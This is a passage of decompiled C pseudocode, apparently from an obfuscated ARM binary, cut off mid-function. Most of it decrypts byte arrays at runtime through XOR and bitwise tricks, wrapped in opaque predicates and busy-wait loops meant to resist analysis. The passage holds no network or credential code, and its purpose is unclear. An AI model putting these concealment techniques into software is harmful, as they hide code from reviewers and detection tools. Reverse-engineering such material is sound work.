  uVar32 = DAT_00020978;
  uVar14 = DAT_00020974;
  puVar24 = auStack_40;
  piVar33 = (int *)auStack_40;
  local_2c = **(int **)(DAT_0002094c + 0x20074);
  uVar28 = (*(uint *)(DAT_00020958 + 0x20098) ^ DAT_0002095c) &
           (*(uint *)(DAT_00020954 + 0x20088) ^ DAT_00020950);
  piVar30 = (int *)(DAT_00020960 + 0x200b0);
  local_3c = param_4;
  local_38 = param_1;
  local_34 = param_2;
  local_30 = param_3;
  if (((uVar28 | DAT_00020968) * (uVar28 & DAT_00020968) +
      (DAT_00020968 & ~uVar28) * (uVar28 & DAT_00020964)) * DAT_0002096c - DAT_00020970 == 0) {
    DataMemoryBarrier(0xb);
  }
  do {
    iVar12 = FUN_00035060(*(uint *)(DAT_00020980 + 0x20108) ^ uVar14,
                          *(uint *)(DAT_00020984 + 0x20114) ^ uVar32);
    iVar27 = *piVar30;
    DataMemoryBarrier(0xb);
  } while (iVar12 == iVar34);
  FUN_00035060(*(uint *)(DAT_00020990 + 0x20148) ^ DAT_00020994 |
               *(uint *)(DAT_00020988 + 0x20138) ^ DAT_0002098c,DAT_00020998);
  uVar20 = DAT_000209b0;
  uVar28 = DAT_000209ac;
  uVar18 = DAT_000209a8;
  iVar34 = DAT_000209a4;
  uVar32 = DAT_000209a0;
  uVar14 = DAT_0002099c;
  do {
    iVar12 = FUN_00035060(*(uint *)(DAT_000209b4 + 0x20178) ^ uVar14,
                          *(uint *)(DAT_000209b8 + 0x20184) ^ uVar32);
    uVar13 = FUN_00035060(iVar12 * iVar34,uVar18);
    uVar11 = local_30;
    uVar8 = local_34;
    iVar7 = DAT_00020a0c;
    iVar17 = DAT_00020a08;
    uVar23 = DAT_000209fc;
    uVar21 = DAT_000209f0;
    iVar16 = DAT_000209e4;
    iVar12 = DAT_000209e0;
  } while ((uVar13 ^ uVar28) < uVar20);
  uVar14 = *(uint *)(DAT_000209c4 + 0x201c0) ^ DAT_000209c8 |
           *(uint *)(DAT_000209bc + 0x201b0) ^ DAT_000209c0;
  do {
  } while ((DAT_000209d0 & ~uVar14 | (uVar14 | DAT_000209cc) & DAT_000209d4) + DAT_000209d8 <
           DAT_000209dc);
  if (iVar27 == 0) {
    pbVar26 = (byte *)(DAT_000209e0 + 0x20210);
    pbVar19 = (byte *)(DAT_000209e4 + 0x20218);
    pbVar15 = (byte *)(DAT_00020a08 + 0x20258);
    pbVar22 = (byte *)(DAT_00020a0c + 0x2025c);
    if (((*(uint *)(DAT_000209f4 + 0x20234) ^ DAT_000209f8) *
         (*(uint *)(DAT_000209e8 + 0x20220) ^ DAT_000209ec) | DAT_00020a00) == DAT_00020a04)
    goto LAB_00020618;
    while( true ) {
      bVar1 = *(byte *)(iVar17 + 0x2025a);
      bVar2 = *(byte *)(iVar17 + 0x2025b);
      *pbVar26 = *pbVar15 ^ 0x50;
      *(byte *)(iVar12 + 0x20212) = bVar1 ^ 0x2e;
      *(byte *)(iVar12 + 0x20213) = bVar2 ^ 0xb7;
      bVar1 = *(byte *)(iVar17 + 0x20259);
      *(byte *)(iVar12 + 0x20216) = *(byte *)(iVar17 + 0x2025e) ^ 0x90;
      *(byte *)(iVar12 + 0x20217) = *(byte *)(iVar17 + 0x2025f) ^ 0xe8;
      *(byte *)(iVar12 + 0x20211) = bVar1 + (bVar1 & 0x11) * -2 + '\x11';
      *(byte *)(iVar12 + 0x20214) =
           *(byte *)(iVar17 + 0x2025c) + (*(byte *)(iVar17 + 0x2025c) & 0x4e) * -2 + -0x32;
      *(byte *)(iVar12 + 0x20215) =
           (~*(byte *)(iVar17 + 0x2025d) | 0xc3) & (*(byte *)(iVar17 + 0x2025d) | 0x3c);
      uVar14 = *(uint *)(DAT_00020a10 + 0x202e4);
      uVar32 = *(uint *)(DAT_00020a14 + 0x202ec);
      bVar1 = *(byte *)(iVar17 + 0x20261);
      bVar2 = *(byte *)(iVar17 + 0x20263);
      *(byte *)(iVar12 + 0x20218) = *(byte *)(iVar17 + 0x20260) ^ 0x9c;
      *(byte *)(iVar12 + 0x20219) = bVar1 ^ 0x62;
      *(byte *)(iVar12 + 0x2021b) = bVar2 ^ 0xc;
      bVar1 = *(byte *)(iVar17 + 0x20262);
      *(byte *)(iVar12 + 0x2021e) = *(byte *)(iVar17 + 0x20266) ^ 0x3f;
      bVar2 = *(byte *)(iVar17 + 0x2026c);
      *(byte *)(iVar12 + 0x2021f) = *(byte *)(iVar17 + 0x20267) ^ 0xbe;
      *(byte *)(iVar12 + 0x2021d) =
           ~*(byte *)(iVar17 + 0x20265) & 0x25 | *(byte *)(iVar17 + 0x20265) & 0xda;
      bVar3 = *(byte *)(iVar17 + 0x2026d);
      *(byte *)(iVar12 + 0x2021a) = bVar1 + (bVar1 & 0x16) * -2 + '\x16';
      *(byte *)(iVar12 + 0x2021c) =
           (~*(byte *)(iVar17 + 0x20264) & 0xa5 | *(byte *)(iVar17 + 0x20264) & 0x5a) ^ 0x5b;
      bVar1 = *(byte *)(iVar17 + 0x2026b);
      *(byte *)(iVar12 + 0x20220) =
           ~((*(byte *)(iVar17 + 0x20268) | 0x60) & (~*(byte *)(iVar17 + 0x20268) | 0x9f));
      bVar4 = *(byte *)(iVar17 + 0x20269);
      *(byte *)(iVar12 + 0x20223) = bVar1 ^ 0xdb;
      *(byte *)(iVar12 + 0x20225) = bVar3 ^ 0x29;
      bVar1 = *(byte *)(iVar17 + 0x20272);
      *(byte *)(iVar12 + 0x20221) = bVar4 ^ 0x61;
      bVar3 = *(byte *)(iVar17 + 0x2026a);
      *(byte *)(iVar12 + 0x2022a) = ~bVar1 & 0xc | bVar1 & 0xf3;
      *(byte *)(iVar12 + 0x20222) = (~bVar3 | 0x6f) & (bVar3 | 0x90);
      *(byte *)(iVar12 + 0x20224) = bVar2 + (bVar2 & 0x38) * -2 + '8';
      *(byte *)(iVar12 + 0x20226) =
           ~(*(byte *)(iVar17 + 0x2026e) & 0x5d | ~*(byte *)(iVar17 + 0x2026e) & 0xa2);
      *(byte *)(iVar12 + 0x20227) =
           (~*(byte *)(iVar17 + 0x2026f) & 6 | *(byte *)(iVar17 + 0x2026f) & 0xf9) ^ 200;
      *(byte *)(iVar12 + 0x20228) =
           ~(*(byte *)(iVar17 + 0x20270) & 0x3b | ~*(byte *)(iVar17 + 0x20270) & 0xc4);
      *(byte *)(iVar12 + 0x20229) =
           *(byte *)(iVar17 + 0x20271) + (*(byte *)(iVar17 + 0x20271) & 0x52) * -2 + 'R';
      *(byte *)(iVar12 + 0x2022b) =
           ~(*(byte *)(iVar17 + 0x20273) & 0xed | ~*(byte *)(iVar17 + 0x20273) & 0x12);
      *(byte *)(iVar12 + 0x2022c) =
           *(byte *)(iVar17 + 0x20274) + (*(byte *)(iVar17 + 0x20274) & 0x7c) * -2 + '|';
      *(byte *)(iVar12 + 0x2022d) = *(byte *)(iVar17 + 0x20275) ^ 0xcb;
      *(byte *)(iVar12 + 0x2022e) =
           (~*(byte *)(iVar17 + 0x20276) | 0xb2) & (*(byte *)(iVar17 + 0x20276) | 0x4d);
      *(byte *)(iVar12 + 0x2022f) =
           (~*(byte *)(iVar17 + 0x20277) & 0xe8 | *(byte *)(iVar17 + 0x20277) & 0x17) ^ 0x3e;
      *(byte *)(iVar12 + 0x20230) = *(byte *)(iVar17 + 0x20278) ^ 0xc4;
      *(byte *)(iVar12 + 0x20231) = *(byte *)(iVar17 + 0x20279) ^ 0x8e;
      *(byte *)(iVar12 + 0x20232) =
           (~*(byte *)(iVar17 + 0x2027a) & 0x9c | *(byte *)(iVar17 + 0x2027a) & 99) ^ 0x2a;
      *pbVar19 = *pbVar22 ^ 0xa5;
      *(byte *)(iVar16 + 0x20219) = *(byte *)(iVar7 + 0x2025d) ^ 0xe;
      *(byte *)(iVar16 + 0x2021a) = *(byte *)(iVar7 + 0x2025e) ^ 0xac;
      *(byte *)(iVar16 + 0x2021b) =
           *(byte *)(iVar7 + 0x2025f) + (*(byte *)(iVar7 + 0x2025f) & 0x5c) * -2 + -0x24;
      *(byte *)(iVar16 + 0x2021c) = *(byte *)(iVar7 + 0x20260) ^ 0x19;
      *(byte *)(iVar16 + 0x2021d) =
           *(byte *)(iVar7 + 0x20261) + (*(byte *)(iVar7 + 0x20261) & 0x35) * -2 + '5';
      *(byte *)(iVar16 + 0x2021e) = *(byte *)(iVar7 + 0x20262) ^ 0x1f;
      *(byte *)(iVar16 + 0x2021f) =
           (~*(byte *)(iVar7 + 0x20263) & 0x10 | *(byte *)(iVar7 + 0x20263) & 0xef) ^ 0xb8;
      *(byte *)(iVar16 + 0x20220) =
           *(byte *)(iVar7 + 0x20264) + (*(byte *)(iVar7 + 0x20264) & 0x78) * -2 + 'x';
      *(byte *)(iVar16 + 0x20221) =
           ~*(byte *)(iVar7 + 0x20265) & 0x7e | *(byte *)(iVar7 + 0x20265) & 0x81;
      uVar14 = uVar14 ^ DAT_0002152c;
      uVar14 = (((uVar14 + (uVar32 ^ uVar14 ^ DAT_000215bc)) - (uVar14 & (uVar32 ^ DAT_00021528))) -
               (uVar21 ^ uVar21 + 1)) + DAT_000215c4;
      uVar14 = (uVar14 ^ DAT_000215c8) & uVar14;
      if (uVar14 + (uVar23 ^ uVar23 + 1) + (~uVar14 | DAT_000215c0) != DAT_000215cc) break;
LAB_00020618:
      bVar1 = *(byte *)(iVar17 + 0x2025b);
      *(byte *)(iVar12 + 0x20211) = *(byte *)(iVar17 + 0x20259) ^ 0x11;
      *(byte *)(iVar12 + 0x20213) = bVar1 ^ 0xb7;
      bVar1 = *(byte *)(iVar17 + 0x2025a);
      *(byte *)(iVar12 + 0x20217) = *(byte *)(iVar17 + 0x2025f) ^ 0xe8;
      bVar2 = *pbVar15;
      *(byte *)(iVar12 + 0x20218) = *(byte *)(iVar17 + 0x20260) ^ 0x9c;
      bVar3 = *(byte *)(iVar17 + 0x20265);
      *(byte *)(iVar12 + 0x20212) = ~bVar1 & 0x2e | bVar1 & 0xd1;
      bVar1 = *(byte *)(iVar17 + 0x20264);
      *(byte *)(iVar12 + 0x20215) =
           ~*(byte *)(iVar17 + 0x2025d) & 0x3c | *(byte *)(iVar17 + 0x2025d) & 0xc3;
      *(byte *)(iVar12 + 0x2021c) = bVar1 ^ 0xfe;
      *(byte *)(iVar12 + 0x2021e) = *(byte *)(iVar17 + 0x20266) ^ 0x3f;
      bVar1 = *(byte *)(iVar17 + 0x20268);
      *pbVar26 = (~bVar2 & 0xa4 | bVar2 & 0x5b) ^ 0xf4;
      *(byte *)(iVar12 + 0x20220) = bVar1 ^ 0x9f;
      bVar1 = *(byte *)(iVar17 + 0x2025c);
      *(byte *)(iVar12 + 0x20221) = *(byte *)(iVar17 + 0x20269) ^ 0x61;
      *(byte *)(iVar12 + 0x20222) = *(byte *)(iVar17 + 0x2026a) ^ 0x90;
      *(byte *)(iVar12 + 0x2021d) = ~bVar3 & 0x25 | bVar3 & 0xda;
      bVar2 = *(byte *)(iVar17 + 0x20267);
      *(byte *)(iVar12 + 0x20214) = (~bVar1 & 0xea | bVar1 & 0x15) ^ 0x24;
      bVar1 = *(byte *)(iVar17 + 0x2025e);
      *(byte *)(iVar12 + 0x20226) = *(byte *)(iVar17 + 0x2026e) ^ 0x5d;
      bVar3 = *(byte *)(iVar17 + 0x2026f);
      *(byte *)(iVar12 + 0x2021f) = ~bVar2 & 0xbe | bVar2 & 0x41;
      *(byte *)(iVar12 + 0x20227) = bVar3 ^ 0xce;
      bVar2 = *(byte *)(iVar17 + 0x20262);
      *(byte *)(iVar12 + 0x20228) = *(byte *)(iVar17 + 0x20270) ^ 0x3b;
      bVar3 = *(byte *)(iVar17 + 0x20271);
      bVar4 = *(byte *)(iVar17 + 0x2026c);
      *(byte *)(iVar12 + 0x20216) = (~bVar1 | 0x6f) & (bVar1 | 0x90);
      bVar1 = *(byte *)(iVar17 + 0x20261);
      *(byte *)(iVar12 + 0x20229) = bVar3 ^ 0x52;
      *(byte *)(iVar12 + 0x20219) = bVar1 ^ 0x62;
      *(byte *)(iVar12 + 0x20224) = ~bVar4 & 0x38 | bVar4 & 199;
      bVar1 = *(byte *)(iVar17 + 0x20272);
      bVar3 = *(byte *)(iVar17 + 0x20263);
      *(byte *)(iVar12 + 0x2021a) = (~bVar2 & 0xa3 | bVar2 & 0x5c) ^ 0xb5;
      bVar2 = *(byte *)(iVar17 + 0x2026b);
      *(byte *)(iVar12 + 0x2022a) = ~bVar1 & 0xc | bVar1 & 0xf3;
      *(byte *)(iVar12 + 0x2021b) = (~bVar3 & 3 | bVar3 & 0xfc) ^ 0xf;
      bVar1 = *(byte *)(iVar17 + 0x2026d);
      *(byte *)(iVar12 + 0x20223) = ~(bVar2 & 0xdb | ~bVar2 & 0x24);
      *(byte *)(iVar12 + 0x20225) = bVar1 + (bVar1 & 0x29) * -2 + ')';
      *(byte *)(iVar12 + 0x2022b) =
           (~*(byte *)(iVar17 + 0x20273) | 0x12) & (*(byte *)(iVar17 + 0x20273) | 0xed);
      *(byte *)(iVar12 + 0x2022c) = *(byte *)(iVar17 + 0x20274) ^ 0x7c;
      *(byte *)(iVar12 + 0x2022d) = *(byte *)(iVar17 + 0x20275) ^ 0xcb;
      *(byte *)(iVar12 + 0x2022e) =
           *(byte *)(iVar17 + 0x20276) + (*(byte *)(iVar17 + 0x20276) & 0x4d) * -2 + 'M';
      *(byte *)(iVar12 + 0x2022f) = *(byte *)(iVar17 + 0x20277) ^ 0xd6;
      *(byte *)(iVar12 + 0x20230) =
           *(byte *)(iVar17 + 0x20278) + (*(byte *)(iVar17 + 0x20278) & 0x44) * -2 + -0x3c;
      *(byte *)(iVar12 + 0x20231) = *(byte *)(iVar17 + 0x20279) ^ 0x8e;
      *(byte *)(iVar12 + 0x20232) = *(byte *)(iVar17 + 0x2027a) ^ 0xb6;
      *pbVar19 = *pbVar22 ^ 0xa5;
      *(byte *)(iVar16 + 0x20219) =
           ~*(byte *)(iVar7 + 0x2025d) & 0xe | *(byte *)(iVar7 + 0x2025d) & 0xf1;
      *(byte *)(iVar16 + 0x2021a) = *(byte *)(iVar7 + 0x2025e) ^ 0xac;
      *(byte *)(iVar16 + 0x2021b) = *(byte *)(iVar7 + 0x2025f) ^ 0xdc;
      *(byte *)(iVar16 + 0x2021c) =
           (~*(byte *)(iVar7 + 0x20260) & 0xcf | *(byte *)(iVar7 + 0x20260) & 0x30) ^ 0xd6;
      *(byte *)(iVar16 + 0x2021d) =
           *(byte *)(iVar7 + 0x20261) + (*(byte *)(iVar7 + 0x20261) & 0x35) * -2 + '5';
      *(byte *)(iVar16 + 0x2021e) =
           *(byte *)(iVar7 + 0x20262) + (*(byte *)(iVar7 + 0x20262) & 0x1f) * -2 + '\x1f';
      *(byte *)(iVar16 + 0x2021f) =
           (~*(byte *)(iVar7 + 0x20263) & 0x36 | *(byte *)(iVar7 + 0x20263) & 0xc9) ^ 0x9e;
      *(byte *)(iVar16 + 0x20220) = *(byte *)(iVar7 + 0x20264) ^ 0x78;
      *(byte *)(iVar16 + 0x20221) =
           ~(*(byte *)(iVar7 + 0x20265) & 0x7e | ~*(byte *)(iVar7 + 0x20265) & 0x81);
    }
    bVar1 = *(byte *)(iVar7 + 0x20266);
    if (DAT_000219f4 <
        ((*(uint *)(DAT_000219d8 + 0x20a30) ^ DAT_000219ec) &
         (*(uint *)(DAT_000219e4 + 0x20a3c) ^ DAT_000219e8) |
        (*(uint *)(DAT_000219e4 + 0x20a3c) ^ DAT_000219e0) &
        (*(uint *)(DAT_000219d8 + 0x20a30) ^ DAT_000219dc)) + DAT_000219f0) {
      bVar2 = *(byte *)(iVar7 + 0x20268);
      bVar3 = *(byte *)(iVar7 + 0x2026a);
      *(byte *)(iVar16 + 0x20223) = *(byte *)(iVar7 + 0x20267) ^ 0x43;
      *(byte *)(iVar16 + 0x20224) = bVar2 ^ 0xb1;
      *(byte *)(iVar16 + 0x20226) = bVar3 ^ 0x2a;
      bVar2 = *(byte *)(iVar7 + 0x20269);
      *(byte *)(iVar16 + 0x20227) = *(byte *)(iVar7 + 0x2026b) ^ 0xa2;
      bVar3 = *(byte *)(iVar7 + 0x20273);
      *(byte *)(iVar16 + 0x2022a) = *(byte *)(iVar7 + 0x2026e) ^ 0x7d;
      *(byte *)(iVar16 + 0x2022b) = *(byte *)(iVar7 + 0x2026f) ^ 0xd;
      *(byte *)(iVar16 + 0x20222) = ~((bVar1 | 0x23) & (~bVar1 | 0xdc));
      *(byte *)(iVar16 + 0x20228) =
           ~(*(byte *)(iVar7 + 0x2026c) & 0x5f | ~*(byte *)(iVar7 + 0x2026c) & 0xa0);
      bVar4 = *(byte *)(iVar7 + 0x20272);
      *(byte *)(iVar16 + 0x20229) =
           *(byte *)(iVar7 + 0x2026d) + (*(byte *)(iVar7 + 0x2026d) & 5) * -2 + -0x7b;
      bVar5 = *(byte *)(iVar7 + 0x20271);
      *(byte *)(iVar16 + 0x20225) = ~((bVar2 | 0x8d) & (~bVar2 | 0x72));
      *(byte *)(iVar16 + 0x2022c) = *(byte *)(iVar7 + 0x20270) ^ 0xc6;
      *(byte *)(iVar16 + 0x2022d) = bVar5 ^ 0x3c;
      *(byte *)(iVar16 + 0x2022f) = bVar3 ^ 0x4b;
      *(byte *)(iVar16 + 0x20230) = *(byte *)(iVar7 + 0x20274) ^ 0x17;
      *(byte *)(iVar16 + 0x20231) = *(byte *)(iVar7 + 0x20275) ^ 0x6a;
      *(byte *)(iVar16 + 0x2022e) = ~bVar4 & 0xb8 | bVar4 & 0x47;
      *(byte *)(iVar16 + 0x20232) =
           ~(*(byte *)(iVar7 + 0x20276) & 0x20 | ~*(byte *)(iVar7 + 0x20276) & 0xdf);
    }
    uVar14 = DAT_00021a90;
    iVar34 = DAT_00021a8c;
    do {
      bVar2 = *(byte *)(iVar7 + 0x20268);
      *(byte *)(iVar16 + 0x20222) = ~bVar1 & 0xdc | bVar1 & 0x23;
      bVar3 = *(byte *)(iVar7 + 0x20269);
      *(byte *)(iVar16 + 0x20223) = *(byte *)(iVar7 + 0x20267) ^ 0x43;
      *(byte *)(iVar16 + 0x20224) = bVar2 ^ 0xb1;
      bVar2 = *(byte *)(iVar7 + 0x2026a);
      *(byte *)(iVar16 + 0x20227) = *(byte *)(iVar7 + 0x2026b) ^ 0xa2;
      *(byte *)(iVar16 + 0x20228) = *(byte *)(iVar7 + 0x2026c) ^ 0x5f;
      *(byte *)(iVar16 + 0x20225) = ~bVar3 & 0x72 | bVar3 & 0x8d;
      *(byte *)(iVar16 + 0x20226) = bVar2 + (bVar2 & 0x2a) * -2 + '*';
      *(byte *)(iVar16 + 0x20229) =
           (~*(byte *)(iVar7 + 0x2026d) & 0x44 | *(byte *)(iVar7 + 0x2026d) & 0xbb) ^ 0xc1;
      uVar32 = *(uint *)(DAT_00021a70 + 0x20c30);
      uVar28 = *(uint *)(DAT_00021a74 + 0x20c38);
      bVar2 = *(byte *)(iVar7 + 0x20272);
      *(byte *)(iVar16 + 0x2022a) = *(byte *)(iVar7 + 0x2026e) ^ 0x7d;
      *(byte *)(iVar16 + 0x2022e) = bVar2 ^ 0xb8;
      bVar2 = *(byte *)(iVar7 + 0x2026f);
      bVar3 = *(byte *)(iVar7 + 0x20270);
      *(byte *)(iVar16 + 0x20232) = *(byte *)(iVar7 + 0x20276) ^ 0x20;
      *(byte *)(iVar16 + 0x2022b) = bVar2 ^ 0xd;
      bVar2 = *(byte *)(iVar7 + 0x20271);
      *(byte *)(iVar16 + 0x2022c) = (~bVar3 & 0x79 | bVar3 & 0x86) ^ 0xbf;
      *(byte *)(iVar16 + 0x2022d) = bVar2 + (bVar2 & 0x3c) * -2 + '<';
      *(byte *)(iVar16 + 0x20230) =
           (~*(byte *)(iVar7 + 0x20274) & 0xcf | *(byte *)(iVar7 + 0x20274) & 0x30) ^ 0xd8;
      *(byte *)(iVar16 + 0x20231) =
           (~*(byte *)(iVar7 + 0x20275) | 0x95) & (*(byte *)(iVar7 + 0x20275) | 0x6a);
      uVar32 = uVar32 ^ DAT_00021a7c;
      *(byte *)(iVar16 + 0x2022f) =
           ~((*(byte *)(iVar7 + 0x20273) | 0xb4) & (~*(byte *)(iVar7 + 0x20273) | 0x4b));
      uVar32 = uVar32 & (uVar28 ^ DAT_00021a78);
    } while (((uVar32 & DAT_00021a84) - (DAT_00021a80 & ~uVar32)) * iVar34 + DAT_00021a88 < uVar14);
    bVar1 = *(byte *)(iVar7 + 0x20278);
    *(byte *)(iVar16 + 0x20236) = *(byte *)(iVar7 + 0x2027a) ^ 0x1d;
    bVar2 = *(byte *)(iVar7 + 0x20277);
    *(byte *)(iVar16 + 0x20237) = *(byte *)(iVar7 + 0x2027b) ^ 0xbf;
    uVar6 = *(undefined *)(iVar7 + 0x2027c);
    *(byte *)(iVar16 + 0x20239) = *(byte *)(iVar7 + 0x2027d) ^ 0x3d;
    bVar3 = *(byte *)(iVar7 + 0x2027f);
    *(undefined *)(iVar16 + 0x20238) = uVar6;
    *(byte *)(iVar16 + 0x2023b) = bVar3 ^ 0xba;
    bVar3 = *(byte *)(iVar7 + 0x20279);
    *(byte *)(iVar16 + 0x20234) = ~bVar1 & 0xe2 | bVar1 & 0x1d;
    *(byte *)(iVar16 + 0x2023a) =
         ~*(byte *)(iVar7 + 0x2027e) & 0x95 | *(byte *)(iVar7 + 0x2027e) & 0x6a;
    *(byte *)(iVar16 + 0x20233) = ~(bVar2 & 7 | ~bVar2 & 0xf8);
    bVar1 = *(byte *)(iVar7 + 0x20281);
    *(byte *)(iVar16 + 0x20235) = ~((bVar3 | 0x88) & (~bVar3 | 0x77));
    *(byte *)(iVar16 + 0x2023c) = *(byte *)(iVar7 + 0x20280) ^ 0xed;
    *(byte *)(iVar16 + 0x2023e) = *(byte *)(iVar7 + 0x20282) ^ 0x66;
    iVar12 = DAT_00021cb8;
    iVar34 = DAT_00021cb4;
    bVar2 = *(byte *)(DAT_00021cb4 + 0x20ddd);
    bVar3 = *(byte *)(DAT_00021cb4 + 0x20dde);
    bVar4 = *(byte *)(DAT_00021cb4 + 0x20ddf);
    *(byte *)(DAT_00021cb8 + 0x20df8) = *(byte *)(DAT_00021cb4 + 0x20ddc) ^ 0x4a;
    *(byte *)(iVar12 + 0x20dfb) = bVar4 ^ 0xd5;
    *(byte *)(iVar16 + 0x2023d) = ~bVar1 & 0x94 | bVar1 & 0x6b;
    bVar1 = *(byte *)(iVar34 + 0x20de6);
    *(byte *)(iVar12 + 0x20df9) = ~bVar2 & 0x37 | bVar2 & 200;
    bVar2 = *(byte *)(iVar34 + 0x20de1);
    *(byte *)(iVar12 + 0x20e02) = bVar1 ^ 0xed;
    *(byte *)(iVar12 + 0x20dfd) = ~bVar2 & 0xc6 | bVar2 & 0x39;
    bVar1 = *(byte *)(iVar34 + 0x20de7);
    *(byte *)(iVar12 + 0x20dfe) =
         ~*(byte *)(iVar34 + 0x20de2) & 0x40 | *(byte *)(iVar34 + 0x20de2) & 0xbf;
    *(byte *)(iVar12 + 0x20e03) = bVar1 ^ 0x62;
    bVar1 = *(byte *)(iVar34 + 0x20de8);
    *(byte *)(iVar12 + 0x20dfa) = bVar3 + (bVar3 & 0x76) * -2 + 'v';
    *(byte *)(iVar12 + 0x20e04) = bVar1 ^ 0x22;
    bVar1 = *(byte *)(iVar34 + 0x20de0);
    *(byte *)(iVar12 + 0x20e05) = *(byte *)(iVar34 + 0x20de9) ^ 0xd9;
    bVar2 = *(byte *)(iVar34 + 0x20de4);
    bVar3 = *(byte *)(iVar34 + 0x20de3);
    *(byte *)(iVar12 + 0x20e06) = *(byte *)(iVar34 + 0x20dea) ^ 0x10;
    *(byte *)(iVar12 + 0x20dfc) = (~bVar1 & 0x45 | bVar1 & 0xba) ^ 0xc0;
    bVar1 = *(byte *)(iVar34 + 0x20de5);
    *(byte *)(iVar12 + 0x20dff) = bVar3 + (bVar3 & 0x11) * -2 + -0x6f;
    *(byte *)(iVar12 + 0x20e00) = ~(bVar2 & 0x36 | ~bVar2 & 0xc9);
    *(byte *)(iVar12 + 0x20e01) = bVar1 + (bVar1 & 0x22) * -2 + -0x5e;
    *(byte *)(iVar12 + 0x20e07) =
         ~(*(byte *)(iVar34 + 0x20deb) & 0x9b | ~*(byte *)(iVar34 + 0x20deb) & 100);
    *(byte *)(iVar12 + 0x20e08) =
         ~(*(byte *)(iVar34 + 0x20dec) & 0x47 | ~*(byte *)(iVar34 + 0x20dec) & 0xb8);
    *(byte *)(iVar12 + 0x20e09) = *(byte *)(iVar34 + 0x20ded) ^ 0x42;
    *(byte *)(iVar12 + 0x20e0a) = *(byte *)(iVar34 + 0x20dee) ^ 0xbe;
    *(byte *)(iVar12 + 0x20e0b) = *(byte *)(iVar34 + 0x20def) ^ 7;
    *(byte *)(iVar12 + 0x20e0c) =
         ~*(byte *)(iVar34 + 0x20df0) & 0xe8 | *(byte *)(iVar34 + 0x20df0) & 0x17;
    *(byte *)(iVar12 + 0x20e0d) = *(byte *)(iVar34 + 0x20df1) ^ 0x12;
    *(byte *)(iVar12 + 0x20e0e) = *(byte *)(iVar34 + 0x20df2) ^ 0xa8;
    *(byte *)(iVar12 + 0x20e0f) = *(byte *)(iVar34 + 0x20df3) ^ 0xec;
    *(byte *)(iVar12 + 0x20e10) =
         ~(*(byte *)(iVar34 + 0x20df4) & 0x9f | ~*(byte *)(iVar34 + 0x20df4) & 0x60);
    *(byte *)(iVar12 + 0x20e11) = *(byte *)(iVar34 + 0x20df5) ^ 0x13;
    *(byte *)(iVar12 + 0x20e12) = *(byte *)(iVar34 + 0x20df6) ^ 9;
    *(byte *)(iVar12 + 0x20e13) = *(byte *)(iVar34 + 0x20df7) ^ 199;
    *(byte *)(iVar12 + 0x20e14) =
         (~*(byte *)(iVar34 + 0x20df8) & 0xa1 | *(byte *)(iVar34 + 0x20df8) & 0x5e) ^ 0x38;
    *(byte *)(iVar12 + 0x20e15) =
         ~((*(byte *)(iVar34 + 0x20df9) | 0x53) & (~*(byte *)(iVar34 + 0x20df9) | 0xac));
    *(byte *)(iVar12 + 0x20e16) = *(byte *)(iVar34 + 0x20dfa) ^ 0xef;
    *(byte *)(iVar12 + 0x20e17) =
         ~(*(byte *)(iVar34 + 0x20dfb) & 0xdb | ~*(byte *)(iVar34 + 0x20dfb) & 0x24);
    *(byte *)(iVar12 + 0x20e18) =
         ~(*(byte *)(iVar34 + 0x20dfc) & 0x4b | ~*(byte *)(iVar34 + 0x20dfc) & 0xb4);
    *(byte *)(iVar12 + 0x20e19) =
         *(byte *)(iVar34 + 0x20dfd) + (*(byte *)(iVar34 + 0x20dfd) & 0x34) * -2 + '4';
    *(byte *)(iVar12 + 0x20e1a) =
         *(byte *)(iVar34 + 0x20dfe) + (*(byte *)(iVar34 + 0x20dfe) & 0x62) * -2 + -0x1e;
    *(byte *)(iVar12 + 0x20e1b) =
         ~(*(byte *)(iVar34 + 0x20dff) & 0xa8 | ~*(byte *)(iVar34 + 0x20dff) & 0x57);
    *(byte *)(iVar12 + 0x20e1c) = *(byte *)(iVar34 + 0x20e00) ^ 0x53;
    *(byte *)(iVar12 + 0x20e1d) = *(byte *)(iVar34 + 0x20e01) ^ 0xfd;
    *(byte *)(iVar12 + 0x20e1e) = *(byte *)(iVar34 + 0x20e02) ^ 0xed;
    *(byte *)(iVar12 + 0x20e1f) =
         (~*(byte *)(iVar34 + 0x20e03) & 0xa3 | *(byte *)(iVar34 + 0x20e03) & 0x5c) ^ 0xd9;
    *(byte *)(iVar12 + 0x20e20) =
         *(byte *)(iVar34 + 0x20e04) + (*(byte *)(iVar34 + 0x20e04) & 0x78) * -2 + -8;
    *(byte *)(iVar12 + 0x20e21) = *(byte *)(iVar34 + 0x20e05) ^ 0x24;
    *(byte *)(iVar12 + 0x20e22) =
         ~*(byte *)(iVar34 + 0x20e06) & 0xa5 | *(byte *)(iVar34 + 0x20e06) & 0x5a;
    *(byte *)(iVar12 + 0x20e23) =
         (~*(byte *)(iVar34 + 0x20e07) & 99 | *(byte *)(iVar34 + 0x20e07) & 0x9c) ^ 0x53;
    *(byte *)(iVar12 + 0x20e24) =
         (~*(byte *)(iVar34 + 0x20e08) | 3) & (*(byte *)(iVar34 + 0x20e08) | 0xfc);
    *(byte *)(iVar12 + 0x20e25) = *(byte *)(iVar34 + 0x20e09) ^ 0xc6;
    *(byte *)(iVar12 + 0x20e26) = *(byte *)(iVar34 + 0x20e0a) ^ 0xeb;
    *(byte *)(iVar12 + 0x20e27) =
         *(byte *)(iVar34 + 0x20e0b) + (*(byte *)(iVar34 + 0x20e0b) & 0x37) * -2 + '7';
    *(byte *)(iVar12 + 0x20e28) =
         ~*(byte *)(iVar34 + 0x20e0c) & 0xf2 | *(byte *)(iVar34 + 0x20e0c) & 0xd;
    *(byte *)(iVar12 + 0x20e29) = *(byte *)(iVar34 + 0x20e0d) ^ 100;
    *(byte *)(iVar12 + 0x20e2a) = *(byte *)(iVar34 + 0x20e0e) ^ 0x69;
    bVar1 = *(byte *)(iVar34 + 0x20e10);
    *(byte *)(iVar12 + 0x20e2b) = *(byte *)(iVar34 + 0x20e0f) ^ 0x17;
    *(byte *)(iVar12 + 0x20e2c) = (~bVar1 & 0x14 | bVar1 & 0xeb) ^ 0x83;
  }
  uVar14 = DAT_00021aa8;
  puVar31 = (undefined4 *)(DAT_00021cc4 + 0x21214);
  if (((*(uint *)(DAT_00021cc0 + 0x211f0) ^ DAT_00021a98 |
       *(uint *)(DAT_00021cbc + 0x211e0) ^ DAT_00021a94) & DAT_00021a9c) == DAT_00021ab0)
  goto LAB_000212e8;
  while( true ) {
    uVar32 = DAT_00021aa4;
    uVar28 = *(uint *)(DAT_00021cc8 + 0x2122c);
